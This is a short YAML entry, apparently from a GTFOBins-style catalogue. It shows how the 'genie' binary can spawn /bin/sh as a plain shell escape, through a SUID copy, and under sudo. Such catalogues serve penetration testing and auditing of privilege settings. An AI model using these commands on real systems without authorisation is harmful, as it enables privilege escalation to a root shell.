---
functions:
  shell:
    - code: genie -c '/bin/sh'
  suid:
    - code: ./genie -c '/bin/sh'
  sudo:
    - code: sudo genie -c '/bin/sh'
---
